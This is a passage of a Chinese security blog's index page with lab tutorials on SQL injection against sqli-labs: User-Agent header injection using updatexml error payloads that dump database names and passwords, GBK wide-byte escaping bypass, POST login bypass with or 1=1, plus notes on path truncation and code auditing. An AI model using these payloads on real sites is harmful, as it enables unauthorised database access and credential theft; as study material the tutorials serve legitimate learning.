<p>那么我们是不是可以尝试在传参的后面加点进行截断，因为点最后会被windows给处理掉，但是填充了点之后，只会保留包含前面15605093967.png，在传参后的index.php因为路径超过260个字符后的东西都会被舍弃，于是乎我们直接传参后加260个点就可以截断了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4198wnf3nj30z40ni0ue.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419azj97kj30h10n73zx.jpg" alt></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sql注入--0day审计案例(1)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/sql注入--0day审计案例(1)/" class="article-date">
      <time datetime="2019-12-06T17:03:10.453Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/sql注入--0day审计案例(1)/">sql注入--0day审计案例(1)</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>这次我们讲的是一篇适合新手学习的代码审计，因为是给小白学习的代码审计，所以可以利用黑盒+白盒交叉审计的情况下，更好的帮助小白学习并找出漏洞。</p>
<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>phpstudy<br>BlueCMS1.6 sp1源码<br>代码审计工具(Seay源代码审计系统)</p>
<h3 id="审计思路："><a href="#审计思路：" class="headerlink" title="审计思路："></a>审计思路：</h3><p>一般来说，有一定代码功力的人审计代码,会直接将全文代码通读一遍，并寻找传参进行代码审计，但这是对有一定代码功力的人而言。</p>
<p>而对小白而言，利用黑盒和白盒交叉审计的情况下，更能帮助我们找到漏洞。</p>
<p>我们拿到一个CMS后，可以<strong>先寻找功能点</strong>，然后将功能点罗列出来，并对其功能点进行不断测试，然后在拿到代码的情况下，我们可以<strong>对功能点所对应的传参进行审计，那如果知道了传参的意义，就等于知道代码会去做什么，要去做什么了呢</strong>。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znruehwoj30za0rkjud.jpg" alt></p>
<h3 id="大概测试流程："><a href="#大概测试流程：" class="headerlink" title="大概测试流程："></a>大概测试流程：</h3><ul>
<li><strong>总结功能点</strong></li>
<li><strong>黑盒测试功能点：</strong></li>
</ul>
<p>①黑盒测试测不出来的地方进行白盒审计</p>
<p>②测试结果进行白盒审计</p>
<h3 id="Seay源码审计系统"><a href="#Seay源码审计系统" class="headerlink" title="Seay源码审计系统"></a>Seay源码审计系统</h3><p>常见功能简介：<br>1.代码自动高亮<br>2.可以自动审计（误报率高）<br>3.可以快速全局搜索<br>4.可以定位函数<br>5可以监控Mysql(插件)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znttjhddj31fo0rpn5h.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znu53w7bj31hb0rk792.jpg" alt></p>
<hr>
<p>这里我们只讲了代码审计的续篇，下一篇文章我们会开始进行代码审计、漏洞挖掘。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sql_head" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/sql_head/" class="article-date">
      <time datetime="2019-12-06T17:03:10.450Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/sql_head/">head头注入</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>在讲head注入之前，我们先来了解一些PHP的一些超全局变量，在php中有很多预定义的超全局变量，这就意味着他们在一个脚本的任何作用域都可用：</strong></p>
<p><strong>$_REQUEST:</strong>（获取get，post，cookie的传参，但在新版本中已无法获取cookie传参了）</p>
<p><strong>$_POST:</strong>（获取post传参）</p>
<p><strong>$_GET:</strong>(获取get的传参)</p>
<p><strong>$_COOKIE:</strong>(获取cookie的传参)</p>
<p><strong>$_SERVER</strong>(包含了诸如头信息(header),路径(path)等用户信息)</p>
<h3 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h3><p><strong>addslashes()</strong> 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
<p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您<br>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。</p>
<p>遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
<p>语法：addslashes(string)</p>
<p>string 必需。规定要转义的字符串。</p>
<p>返回值： 返回已转义的字符串。</p>
<p>PHP 版本： 4+</p>
<ul>
<li>stripslashes()</li>
</ul>
<p>函数删除由 addslashes() 函数添加的反斜杠。</p>
<p> <strong>mysql_real_escape_string()</strong></p>
<p>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<ul>
<li><p>\x00</p>
</li>
<li><p>\n</p>
</li>
<li><p>\r</p>
</li>
<li><p>\</p>
</li>
<li><p>‘</p>
</li>
<li><p>“</p>
</li>
<li><p>\x1a</p>
</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>语法：mysql_real_escape_string(string,connection)</p>
<p>string 必需。规定要转义的字符串。</p>
<p>connection 可选。规定 MySQL 连接。</p>
<p>如果未规定，则使用上一个连接。</p>
<p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于 mysql_query()。</p>
<h2 id="在这里我们用sqli-靶场less-18为例，"><a href="#在这里我们用sqli-靶场less-18为例，" class="headerlink" title="在这里我们用sqli-靶场less-18为例，"></a>在这里我们用sqli-靶场less-18为例，</h2><p>在此关源代码中我们看到代码中用check_input函数，对uname和passwd进行转义，所以不能在对username和password框进行注入了<br><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/nwswSpT55o1rDq4PQUE4HrdNkta0ob3ZmTFzPVC*JSg!/b/dL8AAAAAAAAA&amp;bo=6QFKAAAAAAADF5A!&amp;rf=viewer_4" alt></p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/i*8eUgB0PmYpObHDUHxSCd*Tm5FLKf2TZEARLVerTFE!/b/dLkAAAAAAAAA&amp;bo=QQJVAAAAAAADFyQ!&amp;rf=viewer_4" alt><br>在往下代码我们看到了插入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;,</span><br><span class="line">&apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></p>
<p>这穿代码将user-agent和ip插入了数据库，而我们的控制点也是这两个，那我们是不是能利用user-agent和ip进行插入，我们可以通过抓包修改他的user-agent进而来进行注入</p>
<h4 id="我们先来说一下updatexml-函数"><a href="#我们先来说一下updatexml-函数" class="headerlink" title="我们先来说一下updatexml() 函数"></a>我们先来说一下<strong>updatexml() 函数</strong></h4><p><strong>语法：updatexml(目标xml文档，xml路径，更新的内容)</strong></p>
<p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询语句！</p>
<p>(0x7e其实代表着16进制的”~”号，转换成16进制其实是为了过一些过滤，使得代码”兼容性”更高，<strong>其实~是为了让语法报错，让我们插入的子查询执行并通过报错带出来</strong>，其实只要能让语法错误的标点符号其实都是可以的)</p>
<p>也可以使用extractvalue（）函数，但低版本的mysql好像不支持这个函数；</p>
<h3 id="我们通过modheard这个插件来对user-agent进行修改"><a href="#我们通过modheard这个插件来对user-agent进行修改" class="headerlink" title="我们通过modheard这个插件来对user-agent进行修改"></a>我们通过modheard这个插件来对user-agent进行修改</h3><hr>
<p>我们先修改user-agent进行测试</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/q6bMPnwd5Da7o6uJLlJ1.yBautUyB39Idb5j8P42WaU!/b/dL8AAAAAAAAA&amp;bo=*QPdAAAAAAADBwE!&amp;rf=viewer_4" alt></p>
<p>发现插入成功！</p>
<p>那么我们就来开始构造payload进行注入：</p>
<ul>
<li>先查询数据库名：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>1’闭合前面，后面的两对闭合单引号是为了补充’$IP’, $uname两个数据位置；在将数据库后面语句注释掉</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/h5wItQlyqSf8q*fWEBZbyuxarCM9MsOS.gkgBK0AFo0!/b/dL4AAAAAAAAA&amp;bo=igSPAAAAAAADFzM!&amp;rf=viewer_4" alt></p>
<ul>
<li>查询表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/6dP8GqUgFPrBrmBaR2CUU0UPLq4cOpZe1BXSsvGGRjs!/b/dFQBAAAAAAAA&amp;bo=PwZoAAAAAAADF2M!&amp;rf=viewer_4" alt></p>
<ul>
<li>查询字段名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/1*jz.Je1g7Y*Ky6011XcNEhXaffD0Mr6HN4hV9JpoLg!/b/dFYBAAAAAAAA&amp;bo=VwZ1AAAAAAADFxY!&amp;rf=viewer_4" alt></p>
<ul>
<li>爆用户名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.UxMQ7MiXCRxXQl1xnmZtDYwcUwVV8wZTNeYe0QlnII!/b/dL8AAAAAAAAA&amp;bo=8wTCAAAAAAADFwc!&amp;rf=viewer_4" alt></p>
<p>爆密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></p>
<p> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/pAockMgFEAkgsrRs7qt12dZT3QgONi0fXpuStLt3Ils!/b/dDcBAAAAAAAA&amp;bo=hQTRAAAAAAADF2I!&amp;rf=viewer_4" alt></p>
<p>这样一次head头的注入就这样完成了，而后面靶场的head注入其实也是对其他head头（referer、cookie）进行注入而已，而注入的方法多种多样……</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sqlkzj" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/sqlkzj/" class="article-date">
      <time datetime="2019-12-06T17:03:10.446Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/sqlkzj/">宽字节注入</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="宽字节sql注入的原理"><a href="#宽字节sql注入的原理" class="headerlink" title="宽字节sql注入的原理"></a>宽字节sql注入的原理</h3><p>gbk使用的是双字节编码,而utf8则是三字节。</p>
<ol>
<li><p>宽字节注入原因是设置的数据库编码和php编码是两个不同的编码，就可能产生宽字节注入漏洞</p>
</li>
<li><p>如果php编码为utf8,而sql语句set names gbk 这样配置可能会导致编码在转换时出现注入漏洞。</p>
</li>
<li><p>set names x.就等同设置了数据库连接，发出，接收的编码<br>(宽字节sql注入就是php在发送数据到数据库过程中使用了语句进行set names gbk或set claracter_set_client=gbk,但由于被一些字符集转换而导致宽字节注入)</p>
</li>
</ol>
<p>先引入一个php函数:</p>
<h3 id="megic-quotes-gpc-魔术信号开关"><a href="#megic-quotes-gpc-魔术信号开关" class="headerlink" title="megic_quotes_gpc(魔术信号开关):"></a><strong>megic_quotes_gpc(魔术信号开关):</strong></h3><p>当php传参时<strong>有特殊字符就会在前面加”\”来转译字符</strong> 来过滤，比如单引号，双引号，反斜线，null字符等都会被转义。(会对特殊字符进行转义)<br>在php作用是 <strong>判断解析用户输入的数据</strong>，包括post, get , cookie传过来的<strong>可疑数据增加转义字符</strong>如”\”,减少可疑数据对程序和数据库的影响而导致出错。 就是说<strong>如果有特殊字符，他就会在前面加一个反斜杠来进行过滤</strong>，那我们该如何绕过呢？</p>
<h2 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a><strong>绕过原理：</strong></h2><p>在gbk编码中，\的编码为%5c,而中文字符”运”的编码为%df%5c,那么我们可不可以在这里做文章呢？</p>
<p>我们在使用引号去测试注入的时候，可能会被\转义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=1\&apos;&apos; limit 0,1</span><br></pre></td></tr></table></figure></p>
<p>被转义使我们无法进行注入，那我们能不能使用%df去和\编码%5c结合，变成一个运字，使得单引号闭合，’逃过’了被转义的命运。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1%df%5c&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure>
<p>转义变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure>
<p>转义后执行sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; union select 1,user()#&apos; limit 0,1</span><br></pre></td></tr></table></figure></p>
<p>这是因为php和mysql使用了两种编码，使转码过程中出现漏洞。<br>如果我们输入%df”,而php的魔术引号会强制的转换”，在前面加反斜杠\”，而\等于%5c,则代码成为% df%5c”，而%df%5c编码为运字，变成运”，从而\转义字符被合并了，(从而绕过转义。)</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sql2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/sql2/" class="article-date">
      <time datetime="2019-12-06T17:03:10.441Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/sql2/">post注入</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="post注入的介绍"><a href="#post注入的介绍" class="headerlink" title="post注入的介绍"></a>post注入的介绍</h3><p>post注入也是sql注入的一种类型，通过post进行传参的注入，post传参一般是通过表单的方式提交，但本质上和get注入没有多大的区别。通过伪造插入修改语句，使得用户插入的数据也被当成sql代码去执行。</p>
<h3 id="post注入的高危点"><a href="#post注入的高危点" class="headerlink" title="post注入的高危点**"></a>post注入的高危点**</h3><ul>
<li>网页登陆框</li>
<li>网页查询框</li>
<li>与数据库有交互的提交框</li>
</ul>
<p>一般情况下，当我们通过HTML表单提交数据到服务器时，服务端都会在数据库中检查我们输入的数据是否符合要求，然后根据数据库搜索结果返回相应的数据给客户端，但如果我们能控制输入，构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</p>
<p><strong>这里以sqli-less-11做post注入例题讲解：</strong></p>
<p>我们点进去，看到一张登陆的表单，我们思考一下应该如何进行注入</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/IQ8PuQYXRfQeKFbKXgUUpLG8c0u9bRyDxpMCb8JUO7A!/b/dLkAAAAAAAAA&amp;bo=3wSdAQAAAAADB2U!&amp;rf=viewer_4" alt></p>
<p>我们先通过用一个单引号在username上进行测试，发现出现错误信息，结果显示是对’的处理所产生的错误<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.s0IqEEnc82GeYcsj6bUgw654mtuR57kW6RYZGKKnYU!/b/dFYBAAAAAAAA&amp;bo=8AWAAAAAAAADF0c!&amp;rf=viewer_4" alt></p>
<p>我们通过闭合’,在再后面加上or 1=1再将后面注释掉，竟然发现登陆了进去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/kb0Ha8Mr6gvwbdZjJfLhBBPpydpnzihcImL2JKqDjP8!/b/dLYAAAAAAAAA&amp;bo=MwY0AgAAAAADJwE!&amp;rf=viewer_4" alt></p>
<p>这是为什么呢？显而易见，or ’1’ = ‘1’恒为真，而且#后面的密码直接被注释了，那么我们可以直接登录到后台了。<br>那我们能不能通过构造 get 注入中用到的其他的语句代替 or 1=1 进行注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4LkCwAdfoqRthpNHMTnA.EeKDTK*IDTWRjU7*WDKHX4!/b/dLYAAAAAAAAA&amp;bo=tgQRAgAAAAADJ6M!&amp;rf=viewer_4" alt><br>登陆失败，显示报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 2#</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n8nIF5JiU1*uydG*pNEl36opJ4RjWDONYFA.ivtECCE!/b/dL8AAAAAAAAA&amp;bo=lAS0AQAAAAADJyc!&amp;rf=viewer_4" alt><br>登陆失败，无显示,说明字段为2。</p>
<p>我们尝试下猜数据库版本：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/cdMGniPDlkmYnllHrJ8gvx8RMgPKV7bG.DcxpiXeJj8!/b/dFQBAAAAAAAA&amp;bo=jwGZAAAAAAADFyU!&amp;rf=viewer_4" alt></p>
<p>发现不仅登陆成功，并爆出了版本号<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/49Ye2S7pk7SkFSpT1If6A2IfwjT24AjCvEEdme0Plwg!/b/dFQBAAAAAAAA&amp;bo=QgPcAAAAAAADF68!&amp;rf=viewer_4" alt></p>
<p>这时的sql语句如下：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/GQZ9l8h2oJXVpEu6vbrD87kOiB1DuduyH7aVTXGPsUQ!/b/dL4AAAAAAAAA&amp;bo=LAdfAAAAAAADF0Y!&amp;rf=viewer_4" alt><br>去数据库查询了username=1，但查询不到，则联合查询了后面的语句，爆出了数据库版本5.5.53；</p>
<p>在爆出数据库<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JClWQRPGxeIFbUauSoQ2SczVYuSJmlM5JW.2AyJPhNY!/b/dLgAAAAAAAAA&amp;bo=RQfGAQAAAAADB6c!&amp;rf=viewer_4" alt></p>
<p>再通过系统库爆出表，字段，来进一步进行注入！</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 JYP
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit">海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>